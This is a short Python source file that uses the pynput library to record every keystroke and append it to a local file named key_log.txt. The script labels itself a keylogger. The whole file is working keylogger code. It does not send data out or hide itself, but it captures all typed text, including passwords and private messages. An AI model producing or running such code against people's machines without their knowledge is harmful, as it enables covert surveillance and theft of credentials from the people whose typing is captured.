from pynput import keyboard

# Specify the file to save the logged keys
log_file = "key_log.txt"

# Define a function to write keystrokes to the file
def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char:  # For regular characters
                f.write(key.char)
            elif key == keyboard.Key.space:  # Handle spacebar separately
                f.write(' ')
            elif key == keyboard.Key.enter:  # Handle enter separately
                f.write('\n')
            else:
                f.write(f' [{key}] ')  # Handle other keys
    except Exception as e:
        print(f"Error: {e}")

# Listener for key presses
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger running... Press Ctrl+C to stop.")
    listener.join()
